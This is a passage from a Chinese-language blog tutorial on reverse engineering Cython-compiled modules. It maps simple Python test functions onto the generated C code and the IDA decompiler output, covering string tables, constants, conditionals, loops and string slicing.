class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myfunc1</span>():</span><br>    print(<span class="hljs-string">&quot;This is myfunc1.&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_variables</span>():</span><br>    x = <span class="hljs-number">5</span><br>    y = <span class="hljs-string">&quot;variables test.&quot;</span><br>    print(x)<br>    print(y)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_strVar</span>():</span><br>    x = <span class="hljs-string">&quot;Hello world.&quot;</span><br>    print(x)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_global_var</span>():</span><br>    <span class="hljs-keyword">global</span> gy<br>    print(gy)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_cast</span>():</span><br>    x = <span class="hljs-built_in">int</span>(<span class="hljs-number">5</span>)<br>    y = <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>)<br>    print(x, y)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_numbers</span>():</span><br>    x = <span class="hljs-number">123</span><br>    y = <span class="hljs-number">12.3</span><br>    z = <span class="hljs-number">0x112233445566778899AABBCCDD</span><br>    print(x, y, z)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_if</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">456</span>:<br>        print(<span class="hljs-string">&quot;x &gt; 456&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;x &lt;= 456&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_string</span>():</span><br>    x = <span class="hljs-string">&quot;I am str.&quot;</span><br>    y = <span class="hljs-built_in">len</span>(x)<br>    z = x[<span class="hljs-number">1</span>]<br>    w = x[<span class="hljs-number">2</span>:]<br>    print(x, y, z, w)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;am&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(<span class="hljs-string">&quot;yes&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;wrong&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_list</span>():</span><br>    x = <span class="hljs-built_in">list</span>()<br>    x.append(<span class="hljs-number">1</span>)<br>    x.append(<span class="hljs-number">2</span>)<br>    x.append(<span class="hljs-number">3</span>)<br>    x.append(<span class="hljs-number">4</span>)<br>    x.append(<span class="hljs-string">&quot;five&quot;</span>)<br>    print(x)<br>    print(<span class="hljs-built_in">len</span>(x))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>        print(i)<br>    x = x[<span class="hljs-number">1</span>:]<br>    x[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] = [<span class="hljs-number">22</span>, <span class="hljs-number">33</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_dict</span>():</span><br>    x = &#123;&#125;<br>    x[<span class="hljs-string">&quot;one&quot;</span>] = <span class="hljs-number">1</span><br>    x[<span class="hljs-string">&quot;two&quot;</span>] = <span class="hljs-number">2</span><br>    x[<span class="hljs-string">&quot;three&quot;</span>] = <span class="hljs-number">3</span><br>    y = x[<span class="hljs-string">&quot;one&quot;</span>]<br>    z = x[<span class="hljs-string">&quot;two&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;one&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(y)<br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> x:<br>        print(k, x[k])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_for</span>():</span><br>    s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>        s = s + i<br>    print(s)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_while</span>():</span><br>    s = <span class="hljs-number">0</span><br>    i = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> i &lt;= <span class="hljs-number">100</span>:<br>        s = s + i<br>        i += <span class="hljs-number">1</span><br>    print(s)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_exception</span>():</span><br>    x = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">try</span>:<br>        x = x + <span class="hljs-string">&quot;1&quot;</span><br>        print(x)<br>    <span class="hljs-keyword">except</span> NameError:<br>        print(<span class="hljs-string">&quot;Variable x is not defined&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&quot;Something else went wrong&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_datetime</span>():</span><br>    x = datetime.datetime.now()<br>    print(x)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_format</span>():</span><br>    x = <span class="hljs-number">1</span><br>    y = <span class="hljs-string">&quot;One&quot;</span><br>    z = <span class="hljs-string">&quot;%s is %d&quot;</span> % (y, x)<br>    print(z)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_math</span>():</span><br>    x = math.ceil(<span class="hljs-number">1.4</span>)<br>    y = math.floor(<span class="hljs-number">1.4</span>)<br><br>    print(x) <span class="hljs-comment"># returns 2</span><br>    print(y) <span class="hljs-comment"># returns 1</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_arg</span>(<span class="hljs-params">x, y, z</span>):</span><br>    x = x + <span class="hljs-number">1</span><br>    y = y + <span class="hljs-string">&quot;2&quot;</span><br>    z = z[:]<br>    print(x, y, z)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test_class</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        self.aa = <span class="hljs-number">1</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_class_hh</span>(<span class="hljs-params">self</span>):</span><br>        print(self.aa)<br><br>    <br><br>gy = <span class="hljs-number">123</span><br>myfunc1()<br>test_variables()<br>test_strVar()<br>test_global_var()<br>test_cast()<br>test_numbers()<br>test_string()<br>test_list()<br>test_dict()<br>test_for()<br>test_while()<br>test_exception()<br>test_datetime()<br>test_format()<br>test_math()<br>test_arg(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;2&quot;</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>])<br><br></code></pre></td></tr></table></figure><h2 id="字符串表-pyx-string-tab"><a href="#字符串表-pyx-string-tab" class="headerlink" title="字符串表 __pyx_string_tab"></a>字符串表 __pyx_string_tab</h2><p>字符串表算是 Cython 动态库逆向非常重要的一个入口了，字符串表记录 Python 代码中引用的字符串。</p><p>在 hello.c 源文件中可以找到 __pyx_string_tab</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>PyObject **p; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *s; <br>                <span class="hljs-keyword">const</span> Py_ssize_t n; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* encoding;<br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> is_unicode; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> is_str; <br>                <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> intern; <br>               &#125; __Pyx_StringTabEntry;<br><br><span class="hljs-keyword">static</span> PyObject *__pyx_kp_s_1;<br><span class="hljs-keyword">static</span> PyObject *__pyx_kp_s_Hello_world;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __pyx_k_1[] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> __pyx_k_Hello_world[] = <span class="hljs-string">&quot;Hello world.&quot;</span>;<br><br><br><span class="hljs-keyword">static</span> __Pyx_StringTabEntry __pyx_string_tab[] = &#123;<br>  &#123;&amp;__pyx_kp_s_1, __pyx_k_1, <span class="hljs-keyword">sizeof</span>(__pyx_k_1), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>  &#123;&amp;__pyx_kp_s_Hello_world, __pyx_k_Hello_world, <span class="hljs-keyword">sizeof</span>(__pyx_k_Hello_world), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>  &#123;&amp;__pyx_kp_s_I_am_str, __pyx_k_I_am_str, <span class="hljs-keyword">sizeof</span>(__pyx_k_I_am_str), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;,<br>  &#123;&amp;__pyx_n_s_NameError, __pyx_k_NameError, <span class="hljs-keyword">sizeof</span>(__pyx_k_NameError), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;,<br>    ......<br>  &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;<br>&#125;<br><br>__Pyx_InitStrings(__pyx_string_tab)<br></code></pre></td></tr></table></figure><p><code>__pyx_string_tab</code> 将 <code>PyObject</code> 与对应的字符串关联起来，最后调用 <code>__Pyx_InitStrings</code> 初始化所有字符串对象。</p><p>在 IDA 逆向分析时，查找字符串引用，可以快速定位到<code>__pyx_string_tab</code> ，然后根据 <code>__Pyx_StringTabEntry</code> 定位程序对某个字符串 <code>PyObject</code> 的引用。</p><img src="/2021/05/07/Cython-Reverse/image-20210507215019652.png" class="" title="image-20210507215019652"><h2 id="整数常量的构造"><a href="#整数常量的构造" class="headerlink" title="整数常量的构造"></a>整数常量的构造</h2><p>整数在 Cython 里面也是 <code>PyObject</code>，整数常量属于全局变量，在 <code>__Pyx_InitGlobals</code> 中初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++">__pyx_float_1_4 = PyFloat_FromDouble(<span class="hljs-number">1.4</span>); <br>__pyx_int_0 = PyInt_FromLong(<span class="hljs-number">0</span>);<br>__pyx_int_1 = PyInt_FromLong(<span class="hljs-number">1</span>);<br>__pyx_int_2 = PyInt_FromLong(<span class="hljs-number">2</span>);<br>__pyx_int_3 = PyInt_FromLong(<span class="hljs-number">3</span>);<br>__pyx_int_4 = PyInt_FromLong(<span class="hljs-number">4</span>);<br>__pyx_int_5 = PyInt_FromLong(<span class="hljs-number">5</span>);<br>__pyx_int_6 = PyInt_FromLong(<span class="hljs-number">6</span>);<br>__pyx_int_22 = PyInt_FromLong(<span class="hljs-number">22</span>);<br>__pyx_int_33 = PyInt_FromLong(<span class="hljs-number">33</span>);<br>__pyx_int_100 = PyInt_FromLong(<span class="hljs-number">100</span>);<br>__pyx_int_123 = PyInt_FromLong(<span class="hljs-number">123</span>);<br>__pyx_int_1357463230989497419223659171037 = PyInt_FromString((<span class="hljs-keyword">char</span> *)<span class="hljs-string">&quot;1357463230989497419223659171037&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_myfunc1(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_2test_variables(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_4test_strVar(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_6test_global_var(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_8test_cast(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_10test_numbers(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_12test_if(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_14test_string(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_16test_list(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_18test_dict(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_20test_for(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_22test_while(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_24test_exception(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_26test_datetime(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_28test_format(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_30test_math(CYTHON_UNUSED PyObject *__pyx_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_32test_arg(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_x, PyObject *__pyx_v_y, PyObject *__pyx_v_z); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_10test_class___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); <span class="hljs-comment">/* proto */</span><br><span class="hljs-keyword">static</span> PyObject *__pyx_pf_5hello_10test_class_2test_class_hh(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self); <span class="hljs-comment">/* proto */</span><br></code></pre></td></tr></table></figure><p>重点看一下 <code>__pyx_pf_5hello_32test_arg</code> 与 <code>__pyx_pf_5hello_10test_class_2test_class_hh</code></p><p><code>__pyx_pf_5hello_32test_arg</code> 的 py 定义是 <code>def test_arg(x, y, z)</code> 因此多了几个参数。</p><p><code>__pyx_pf_5hello_10test_class_2test_class_hh</code> 是类函数 test_class.test_class_hh , 所以有一个 self 参数。</p><h2 id="myfunc1-分析"><a href="#myfunc1-分析" class="headerlink" title="myfunc1() 分析"></a>myfunc1() 分析</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">PyObject *__cdecl <span class="hljs-title">PyObject_Call</span><span class="hljs-params">(PyObject *callable_object, PyObject *args, PyObject *kw)</span></span>;<br><br>v0 = PyTuple_Pack(<span class="hljs-number">1LL</span>, __pyx_kp_s_This_is_myfunc1); <span class="hljs-comment">// args</span><br>v2 = PyObject_GetAttr(__pyx_b, __pyx_n_s_print) <span class="hljs-comment">// __pyx_b -&gt; PyImport_AddModule(&quot;builtins&quot;);</span><br>PyObject_Call(v2, v1, <span class="hljs-number">0LL</span>)<br></code></pre></td></tr></table></figure><h2 id="test-variables-分析"><a href="#test-variables-分析" class="headerlink" title="test_variables() 分析"></a>test_variables() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myfunc1</span>():</span><br>    print(<span class="hljs-string">&quot;This is myfunc1.&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = __pyx_kp_s_variables_test; <span class="hljs-comment">// 引用字符串</span><br>x = PyLong_FromLong(<span class="hljs-number">5LL</span>);<br><br><span class="hljs-comment">// 调用 print</span><br>args = PyTuple_Pack(<span class="hljs-number">1LL</span>, x);<br>v6 = PyObject_GetAttr(__pyx_b, __pyx_n_s_print);<br>PyObject_Call(v6, args, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure><h2 id="test-global-var-分析"><a href="#test-global-var-分析" class="headerlink" title="test_global_var() 分析"></a>test_global_var() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_global_var</span>():</span><br>    <span class="hljs-keyword">global</span> gy<br>    print(gy)<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = PyObject_GetAttr(__pyx_b, __pyx_n_s_gy); <span class="hljs-comment">// 从当前模块查找globals</span><br><br><span class="hljs-comment">// 调用 print</span><br>v1 = PyTuple_Pack(<span class="hljs-number">1LL</span>, v0);<br>v3 = PyObject_GetAttr(__pyx_b, __pyx_n_s_print);<br>PyObject_Call(v3, v2, <span class="hljs-number">0LL</span>);<br></code></pre></td></tr></table></figure><h2 id="test-numbers-分析"><a href="#test-numbers-分析" class="headerlink" title="test_numbers() 分析"></a>test_numbers() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_numbers</span>():</span><br>    x = <span class="hljs-number">123</span><br>    y = <span class="hljs-number">12.3</span><br>    z = <span class="hljs-number">0x112233445566778899AABBCCDD</span><br>    print(x, y, z)<br></code></pre></td></tr></table></figure><p>print 三个参数，构造元组。<br>decompiler 识别出来的数据结构有问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov     edi, 3          ; size<br>call    _PyTuple_New<br>mov     [rax+18h], r12  ; 123<br>mov     [rax+20h], r15  ; 12.3<br>mov     [rax+28h], r14  ; 0x112233445566778899AABBCCDD<br></code></pre></td></tr></table></figure><p>这段代码也可以看出 Tuple 构造方法</p><h2 id="test-if-分析"><a href="#test-if-分析" class="headerlink" title="test_if() 分析"></a>test_if() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_if</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">456</span>:<br>        print(<span class="hljs-string">&quot;x &gt; 456&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;x &lt;= 456&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++">v2 = PyObject_RichCompare(a2, __pyx_int_456, <span class="hljs-number">4</span>);<br>v5 = PyObject_IsTrue(v2);<br><span class="hljs-keyword">if</span> ( v5 )<br>    <span class="hljs-keyword">goto</span> LABEL_8;<br><span class="hljs-keyword">goto</span> LABEL_13;<br><br>LABEL_8 =&gt; 输出  x  &gt; <span class="hljs-number">456</span><br>LABEL_13 =&gt; 输出 x &lt;= <span class="hljs-number">456</span><br></code></pre></td></tr></table></figure><h2 id="test-for-分析"><a href="#test-for-分析" class="headerlink" title="test_for() 分析"></a>test_for() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_for</span>():</span><br>    s = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>        s = s + i<br>    print(s)<br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3 = PyLong_FromLong(0<span class="hljs-class">LL);</span><br>v0 = __pyx_int_0;<br>v2 = 0<br>while ( 1 ) &#123;<br>v0 = PyNumber_Add(v0, v3);<br>++v2;<br><span class="hljs-built_in">if </span>( v2 &gt;= 101 )<br>       break;<br>   v3 = PyLong_FromLong(v2);<br>&#125;<br><span class="hljs-keyword">.</span>.... print 代码忽略 ......<br></code></pre></td></tr></table></figure><p>range(101) 直接翻译成等价最优形式了。</p><h2 id="test-string-分析"><a href="#test-string-分析" class="headerlink" title="test_string() 分析"></a>test_string() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_string</span>():</span><br>    x = <span class="hljs-string">&quot;I am str.&quot;</span><br>    y = <span class="hljs-built_in">len</span>(x)<br>    z = x[<span class="hljs-number">1</span>]<br>    w = x[<span class="hljs-number">2</span>:]<br>    print(x, y, z, w)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;am&quot;</span> <span class="hljs-keyword">in</span> x:<br>        print(<span class="hljs-string">&quot;yes&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;wrong&quot;</span>)<br></code></pre></td></tr></table></figure><p>下标访问  <code> z = x[1]</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = __pyx_kp_s_I_am_str;<br><br>item = (v4-&gt;sq_item)(v0, <span class="hljs-number">1LL</span>); <span class="hljs-comment">// sq_item 访问下标 PyObject* PySequence_GetItem(PyObject *o, Py_ssize_t i)</span><br>或者<br>v31 = PyLong_FromSsize_t(<span class="hljs-number">1LL</span>);<br>item = PyObject_GetItem(v0, v31);<br><br></code></pre></td></tr></table></figure><p>切片访问  w = x[2:]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">v0 = __pyx_kp_s_I_am_str;<br>__pyx_slice__2 = PySlice_New(__pyx_int_2, &amp;_Py_NoneStruct, &amp;_Py_NoneStruct);<br>v6 = (v0-&gt;ob_type-&gt;tp_as_mapping-&gt;mp_subscript)(v0, __pyx_slice__2);<br></code></pre></td></tr></table></figure><p><code>in</code> 关键字</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">v10</span> = PySequence_Contains(v1, __pyx_n_s_am)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="test-list-分析"><a href="#test-list-分析" class="headerlink" title="test_list() 分析"></a>test_list() 分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_list</span>():</span><br>    x = <span class="hljs-built_in">list</span>()<br>    x.append(<span class="hljs-number">1</span>)<br>    x.append(<span class="hljs-number">2</span>)<br>    x.append(<span class="hljs-number">3</span>)<br>    x.append(<span class="hljs-number">4</span>)<br>    x.append(<span class="hljs-string">&quot;five&quot;</span>)<br>    print(x)<br>    print(<span class="hljs-built_in">len</span>(x))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>        print(i)<br>    x = x[<span class="hljs-number">1</span>:]<br>    x[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] = [<span class="hljs-number">22</span>, <span class="hljs-number">33</span>]<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 